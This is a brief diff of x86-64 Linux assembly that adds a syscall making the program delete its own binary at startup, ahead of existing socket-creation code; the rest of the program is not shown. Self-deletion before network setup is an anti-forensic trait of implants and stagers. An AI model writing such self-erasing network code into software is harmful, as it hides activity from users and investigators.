@@ -2,8 +2,9 @@
 .global _start
 _start:
 
-#unlink
-#fork
+mov rax, 87
+mov rdi, [rsp+8]
+syscall
 
 sub rsp, 1024
 mov rax, 41
@@ -55,6 +56,9 @@ xor r10, r10
 mov r8, 0x1000
 syscall
 add rsp, 1024
+jmp exit
+
+exit:
 mov rax, 60
 mov rdi, 0
 syscall
